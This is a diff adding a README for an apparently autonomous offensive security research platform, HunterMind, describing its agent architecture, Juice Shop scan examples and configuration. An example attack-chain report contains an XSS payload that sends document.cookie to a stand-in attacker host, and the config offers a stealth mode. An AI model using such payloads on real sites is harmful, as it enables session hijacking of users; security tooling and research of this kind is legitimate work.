@@ -1,1 +1,620 @@
-# HunterMind-Offensive-Research-Platform
+<div align="center">
+
+# 🦅 HunterMind Offensive Research Platform
+
+### Autonomous Offensive Security Intelligence System
+
+[![Python](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://www.python.org/)
+[![Playwright](https://img.shields.io/badge/Playwright-1.40+-green.svg)](https://playwright.dev/)
+[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Research](https://img.shields.io/badge/Purpose-Offensive%20Security%20Research-red.svg)]()
+
+**Autonomous | Cognitive | Adaptive | Scalable**
+
+</div>
+
+---
+
+## ⚠️ Important Disclaimer
+
+**This platform is for authorized security research and educational purposes ONLY.**
+
+- ✅ **ONLY** use on systems you own or have explicit permission to test
+- ✅ **ONLY** use in controlled research environments
+- ❌ **NEVER** use on production systems without authorization
+- ❌ **NOT** responsible for any illegal or unauthorized use
+- 🔒 **Always** follow responsible disclosure practices
+
+---
+
+## 🎯 What is HunterMind?
+
+**HunterMind** is an **Autonomous Offensive Security Research Platform** that combines:
+
+- 🧠 **Cognitive Architecture** - Human-like reasoning and decision making
+- 🤖 **Multi-Agent System** - Specialized autonomous agents working in coordination
+- ⚔️ **Advanced Offensive Capabilities** - State-of-the-art vulnerability discovery and exploitation
+- 📚 **Continuous Learning** - Meta-learning, reinforcement learning, and sequence learning
+- 🔬 **Research-Oriented** - Built for security researchers and penetration testers
+
+### Core Philosophy
+
+> "Not just a scanner, but an autonomous security researcher that thinks, learns, and adapts."
+
+---
+
+## 🚀 Key Features
+
+### 1. 🧠 Cognitive Architecture
+
+| Component | Description |
+|-----------|-------------|
+| **Cognitive Core** | Unified brain integrating all decision-making |
+| **Brain Loop** | Continuous thinking cycle for real-time operation |
+| **Multi-Memory System** | Episodic, semantic, working, and procedural memory |
+| **Knowledge Graph** | World representation with attack graph integration |
+| **Reasoning Engine** | Symbolic, causal, chain, and uncertainty reasoning |
+| **Planning System** | Strategic, tactical, and execution planning |
+| **Self-Reflection** | Meta-cognition and self-improvement loops |
+
+### 2. 🤖 Multi-Agent System
+
+| Agent | Function |
+|-------|----------|
+| **Recon Agent** | Surface mapping, fingerprinting, technology detection |
+| **Crawler Agent** | SPA-aware crawling, form extraction, API discovery |
+| **XSS Agent** | DOM, reflected, stored XSS detection and exploitation |
+| **SQLi Agent** | Boolean, time-based, error-based, union-based detection |
+| **IDOR Agent** | Object mapping, privilege analysis, access pattern learning |
+| **WAF Agent** | WAF detection, bypass generation, adaptive evasion |
+| **Reasoning Agent** | Attack chain reasoning, dependency analysis |
+| **Planning Agent** | Strategic, tactical, and execution planning |
+| **Exploitation Agent** | Chain execution, privilege escalation, post-exploitation |
+| **Learning Agent** | Experience management, online training, reward engineering |
+
+### 3. ⚔️ Offensive Capabilities
+
+| Capability | Details |
+|------------|---------|
+| **Vulnerability Scanning** | XSS, SQLi, IDOR, SSRF, CSRF, RCE |
+| **Advanced Payloads** | Self-evolving payloads, context-aware generation |
+| **Attack Chaining** | Multi-step attack path generation and execution |
+| **WAF Evasion** | Adaptive bypass techniques, payload obfuscation |
+| **Authentication Attacks** | Session hijacking, token extraction, brute force |
+| **API Security** | GraphQL introspection, REST API fuzzing |
+
+### 4. 📚 Learning Systems
+
+| System | Description |
+|--------|-------------|
+| **Meta-Learning** | Learn how to learn from past experiences |
+| **Reinforcement Learning** | DQN, PPO, Actor-Critic for decision optimization |
+| **Sequence Learning** | Learn successful attack patterns and chains |
+| **Online Learning** | Continuous adaptation, incremental training |
+| **Transfer Learning** | Apply knowledge across different targets |
+
+### 5. 🏗️ Enterprise-Grade Architecture
+
+| Component | Description |
+|-----------|-------------|
+| **Distributed Orchestration** | Scale across multiple nodes |
+| **Async Runtime** | High-performance asynchronous execution |
+| **Plugin System** | Extensible scanner and payload architecture |
+| **Comprehensive Telemetry** | Metrics, tracing, analytics, structured logging |
+| **Multiple Interfaces** | REST API, WebSocket, CLI, Web Dashboard |
+
+---
+
+## 🏛️ Architecture
+
+### System Layers (Bottom to Top)
+
+```
+
+┌─────────────────────────────────────────────────────────────┐
+│                    INTERFACES LAYER                         │
+│         REST API │ WebSocket │ CLI │ Dashboard              │
+├─────────────────────────────────────────────────────────────┤
+│                  ORCHESTRATION LAYER                        │
+│      Orchestrator │ Event Bus │ Task Manager │ Scheduler    │
+├─────────────────────────────────────────────────────────────┤
+│                      AGENTS LAYER                           │
+│   Recon │ Crawler │ XSS │ SQLi │ IDOR │ WAF │ Exploitation │
+├─────────────────────────────────────────────────────────────┤
+│                    COGNITION LAYER                          │
+│   Brain │ Memory │ Knowledge │ Reasoning │ Planning │ Self-Improvement │
+├─────────────────────────────────────────────────────────────┤
+│                     LEARNING LAYER                          │
+│      Meta-Learning │ Reinforcement │ Sequence Learning     │
+├─────────────────────────────────────────────────────────────┤
+│                    OFFENSIVE LAYER                          │
+│         Scanners │ Payloads │ Recon │ Exploitation         │
+├─────────────────────────────────────────────────────────────┤
+│                 INFRASTRUCTURE LAYER                        │
+│    Browser │ Networking │ Auth │ Sandbox │ Runtime         │
+├─────────────────────────────────────────────────────────────┤
+│                      STORAGE LAYER                          │
+│            SQLite │ Vector DB │ Graph DB │ Object Storage   │
+├─────────────────────────────────────────────────────────────┤
+│                      SCHEMAS LAYER                          │
+│              Data Contracts │ Type Definitions              │
+└─────────────────────────────────────────────────────────────┘
+
+```
+
+### Dependency Direction (Strict)
+
+```
+
+interfaces
+↓
+orchestration
+↓
+agents
+↓
+cognition
+↓
+learning
+↓
+offensive
+↓
+infrastructure
+↓
+storage
+↓
+schemas
+
+```
+
+**No circular dependencies allowed!**
+
+---
+
+## 📁 Project Structure
+
+```
+
+HunterMind_Offensive_Research_Platform/
+│
+├── schemas/           # Data contracts (lowest layer)
+├── interfaces/        # API, CLI, Dashboard
+├── orchestration/     # Orchestrator, messaging, scheduler
+├── agents/            # All autonomous agents
+├── cognition/         # Brain, memory, knowledge, reasoning, planning
+├── learning/          # Meta-learning, RL, sequence learning
+├── offensive/         # Scanners, payloads, recon, exploitation
+├── infrastructure/    # Browser, networking, auth, runtime
+├── storage/           # SQLite, vector DB, graph DB
+├── telemetry/         # Metrics, tracing, analytics, logging
+├── configs/           # All configuration files
+├── plugins/           # Extensible plugin system
+├── datasets/          # Training datasets
+├── models/            # Trained models
+├── tests/             # Unit, integration, cognitive tests
+├── docs/              # Documentation
+└── scripts/           # Operational scripts
+
+```
+
+---
+
+## 🔧 Installation
+
+### Prerequisites
+
+```bash
+Python 3.9+
+Node.js (for Playwright)
+8GB RAM (minimum), 16GB+ recommended
+Docker (optional, for sandbox)
+```
+
+Quick Install
+
+```bash
+# Clone the repository
+git clone https://github.com/akkalighter/HunterMind_Offensive_Research_Platform.git
+cd HunterMind_Offensive_Research_Platform
+
+# Run bootstrap script
+chmod +x scripts/bootstrap.sh
+./scripts/bootstrap.sh
+
+# Or manually
+python -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+playwright install chromium
+```
+
+---
+
+🚀 Usage
+
+Command Line Interface
+
+```bash
+# Full security scan
+python cli.py scan https://juice-shop.github.io
+
+# Quick scan (limited pages)
+python cli.py scan https://juice-shop.github.io --quick --max-pages 20
+
+# Scan with authentication
+python cli.py scan https://example.com --auth --username test --password test123
+
+# Resume previous scan
+python cli.py scan --resume scan_20250101_120000
+
+# List all scans
+python cli.py list
+
+# Show statistics
+python cli.py stats
+```
+
+Using the Runner Script
+
+```bash
+# Run full scan
+./scripts/run.sh scan https://juice-shop.github.io
+
+# Start web dashboard
+./scripts/run.sh dashboard
+
+# Show statistics
+./scripts/run.sh stats
+
+# Clean cache
+./scripts/run.sh clean
+```
+
+Web Dashboard
+
+```bash
+# Start the dashboard
+python interfaces/api/fastapi_server.py
+
+# Open in browser
+# http://localhost:5000
+```
+
+Python API
+
+```python
+import asyncio
+from orchestration.orchestrator import Orchestrator
+from agents.crawler_agent import CrawlerAgent
+from offensive.scanners import XSSScanner
+
+async def main():
+    # Initialize orchestrator
+    orchestrator = Orchestrator()
+    
+    # Run scan
+    result = await orchestrator.run_scan("https://juice-shop.github.io")
+    
+    print(f"Found {len(result.vulnerabilities)} vulnerabilities")
+    print(f"Attack chains: {len(result.attack_chains)}")
+
+asyncio.run(main())
+```
+
+---
+
+🧪 Example: Scanning OWASP Juice Shop
+
+```bash
+python cli.py scan https://juice-shop.github.io --max-pages 80
+```
+
+Expected Output
+
+```
+🦅 HunterMind Platform - Scan Started
+============================================================
+
+📡 Phase 1: Reconnaissance
+   ✅ Target: juice-shop.github.io
+   ✅ Technologies: Angular, Express, SQLite
+   ✅ Attack Surface: 156 endpoints, 45 forms
+
+🕷️ Phase 2: Crawling
+   ✅ Pages crawled: 45
+   ✅ JavaScript files: 25
+   ✅ API endpoints: 12
+
+🔍 Phase 3: Vulnerability Scanning
+   🐛 XSS found! Parameter: search | Severity: HIGH
+   🐛 IDOR found! Parameter: id | Severity: MEDIUM
+
+🔗 Phase 4: Attack Chain Generation
+   ✅ Chain: XSS → JWT Extraction → API Abuse (3 steps)
+
+📊 FINAL REPORT
+============================================================
+Vulnerabilities Found: 3
+Attack Chains: 1
+Total Time: 124.5 seconds
+
+📈 Cognitive Stats:
+   Decisions Made: 245
+   Learning Efficiency: 87.3%
+
+============================================================
+✅ Scan completed successfully!
+```
+
+---
+
+📊 Output Examples
+
+Vulnerability Report
+
+```json
+{
+  "vulnerability": {
+    "type": "XSS",
+    "severity": "HIGH",
+    "cvss_score": 7.5,
+    "url": "https://juice-shop.github.io/#/search",
+    "parameter": "q",
+    "payload": "<script>alert('XSS')</script>",
+    "confidence": 0.95,
+    "execution_flow": [
+      "Payload injected via URL parameter",
+      "Reflected in response HTML",
+      "Alert triggered in browser context"
+    ],
+    "remediation": "Use output encoding: HTML entity encode user input"
+  }
+}
+```
+
+Attack Chain Report
+
+```json
+{
+  "chain": {
+    "name": "Session Hijacking Chain",
+    "steps": [
+      {
+        "step": 1,
+        "action": "XSS Injection",
+        "url": "/#/search",
+        "parameter": "q",
+        "payload": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
+      },
+      {
+        "step": 2,
+        "action": "Cookie Exfiltration",
+        "description": "Stolen cookies sent to attacker server"
+      },
+      {
+        "step": 3,
+        "action": "Session Hijacking",
+        "description": "Use stolen cookies to impersonate user"
+      }
+    ],
+    "total_risk": 8.5,
+    "probability": 0.75
+  }
+}
+```
+
+---
+
+⚙️ Configuration
+
+config.yaml
+
+```yaml
+# Core Configuration
+platform:
+  name: "HunterMind"
+  mode: "research"  # research, production, stealth
+  log_level: "INFO"
+
+# Orchestration
+orchestration:
+  max_concurrent_agents: 5
+  task_queue_size: 1000
+  distributed_mode: false
+
+# Cognition
+cognition:
+  brain_loop_interval: 0.5
+  memory_ttl: 3600
+  max_memory_items: 10000
+
+# Learning
+learning:
+  meta_learning_enabled: true
+  rl_epsilon: 0.1
+  rl_gamma: 0.95
+
+# Offensive
+offensive:
+  max_requests_per_second: 10
+  stealth_level: "high"  # low, medium, high
+  payloads_enabled: true
+
+# Infrastructure
+infrastructure:
+  browser_pool_size: 3
+  headless: true
+  proxy_enabled: false
+
+# Telemetry
+telemetry:
+  metrics_enabled: true
+  tracing_enabled: true
+  export_interval: 60
+```
+
+---
+
+🧠 Cognitive Architecture Details
+
+Brain Loop (Continuous Thinking)
+
+```python
+# The brain never stops thinking
+while platform_running:
+    # 1. Observe current state
+    state = observe_environment()
+    
+    # 2. Retrieve relevant memories
+    memories = memory_retriever.find_similar(state)
+    
+    # 3. Reason about next actions
+    decisions = reasoning_engine.think(state, memories)
+    
+    # 4. Plan execution
+    plan = planning_agent.create_plan(decisions)
+    
+    # 5. Execute
+    results = execute_plan(plan)
+    
+    # 6. Learn from outcomes
+    learning_agent.learn(results)
+    
+    # 7. Reflect and improve
+    reflection_engine.analyze(results)
+```
+
+Memory Hierarchy
+
+Memory Type Duration Capacity Purpose
+Working Memory Seconds 7±2 items Current context
+Episodic Memory Days Unlimited Past experiences
+Semantic Memory Permanent Unlimited Knowledge facts
+Procedural Memory Permanent Unlimited Skills and procedures
+
+---
+
+🔬 Research Features
+
+Experimentation Lab
+
+```python
+# Run controlled experiments
+from research.experimentation import ExperimentRunner
+
+runner = ExperimentRunner()
+results = runner.run_experiment({
+    "target": "custom_app",
+    "payloads": ["xss", "sqli"],
+    "iterations": 100,
+    "metrics": ["success_rate", "detection_rate"]
+})
+```
+
+Benchmarking Suite
+
+```bash
+# Run benchmarks
+python scripts/benchmark.sh
+
+# Compare strategies
+python research/benchmarking/strategy_comparator.py
+```
+
+Pattern Discovery
+
+```python
+# Discover new attack patterns
+from research.discovery import PatternDiscovery
+
+discovery = PatternDiscovery()
+patterns = discovery.mine_patterns(dataset)
+```
+
+---
+
+🤝 Contributing
+
+Development Setup
+
+```bash
+# Clone and install in development mode
+git clone ...
+pip install -e .
+
+# Run tests
+pytest tests/
+
+# Run linter
+ruff check .
+
+# Format code
+black .
+```
+
+Code Standards
+
+· Type hints required for all function signatures
+· Docstrings for all public APIs
+· Tests for all new features
+· Follow dependency direction (no circular imports)
+
+Pull Request Process
+
+1. Create feature branch from main
+2. Implement changes with tests
+3. Run full test suite
+4. Submit PR with detailed description
+5. Wait for review and CI checks
+
+---
+
+📚 Documentation
+
+· Architecture Guide
+· Agent Development Guide
+· Cognitive Core Documentation
+· API Reference
+· Research Guide
+
+---
+
+🛡️ Responsible Disclosure
+
+If you discover a vulnerability in this platform:
+
+1. Do NOT exploit it
+2. Report it immediately to: artistajaafari@gmail.com
+3. Allow reasonable time for response
+4. Do not disclose publicly until fixed
+
+---
+
+📄 License
+
+MIT License - See LICENSE file for details.
+
+---
+
+🙏 Acknowledgments
+
+· OWASP for testing environments
+· Playwright team for browser automation
+· PyTorch team for deep learning framework
+· The security research community
+
+---
+
+📞 Contact
+
+· Email: artistajaafari@gmail.com
+· GitHub: akkalighter
+
+---
+
+<div align="center">
+
+🦅 Made for the security research community
+
+Think autonomously. Attack intelligently. Learn continuously.
+
+</div>
